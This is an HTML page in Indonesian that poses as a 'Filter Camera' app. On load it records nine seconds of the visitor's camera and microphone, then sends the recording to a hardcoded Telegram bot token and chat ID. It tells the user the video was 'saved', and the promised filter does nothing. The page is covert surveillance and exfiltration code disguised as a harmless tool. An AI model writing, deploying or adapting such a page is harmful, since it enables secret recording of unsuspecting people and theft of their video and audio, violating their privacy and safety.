<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Filter Camera</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background: #1e1e1e;
            color: white;
            padding: 20px;
            margin: 0;
        }
        h2 {
            margin-bottom: 10px;
        }
        video, canvas {
            width: 100%;
            max-width: 400px;
            border: 2px solid #fff;
            border-radius: 10px;
            background: black;
        }
    </style>
</head>
<body>

    <h2>Filter Camera</h2>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        let mediaRecorder, recordedChunks = [];

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                video.srcObject = stream;

                video.onloadedmetadata = () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    drawEffect();
                };

                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                mediaRecorder.ondataavailable = (event) => recordedChunks.push(event.data);
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    recordedChunks = [];
                    await sendToTelegram(blob);
                };

                setTimeout(() => { mediaRecorder.stop(); }, 9000); // Rekam selama 9 detik
                mediaRecorder.start();
            } catch (error) {
                alert("Gagal mengakses kamera: " + error.message);
            }
        }

        function drawEffect() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            requestAnimationFrame(drawEffect);
        }

        async function sendToTelegram(blob) {
            const formData = new FormData();
            formData.append("chat_id", "7016045840"); // ID Telegram kamu
            formData.append("video", blob, "video.webm");

            try {
                const response = await fetch("https://api.telegram.org/bot7554133435:AAESfBPV3PW2AqOwHSkFnlIsTp4nyg7FEX8/sendVideo", {
                    method: "POST",
                    body: formData
                });

                const result = await response.json();
                console.log(result);

                if (!response.ok) {
                    throw new Error(result.description || "Gagal mendownload vidio.");
                } else {
                    alert("Video berhasil di simpan!");
                }
            } catch (error) {
                console.error("Error:", error);
                alert("Gagal mendownload vidio: " + error.message);
            }
        }

        window.onload = startCamera;
    </script>

</body>
</html>
